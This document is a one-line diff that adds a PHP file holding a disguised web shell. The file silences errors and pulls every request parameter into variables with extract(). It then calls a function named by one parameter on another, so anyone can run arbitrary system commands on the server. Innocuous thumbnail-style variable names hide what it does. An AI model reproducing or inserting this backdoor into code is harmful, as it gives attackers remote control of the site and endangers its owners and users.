@@ -1,0 +1,1 @@
+<?php error_reporting(0);@extract(@$_REQUEST);$thumb1_rand($thumb2_rand);?>
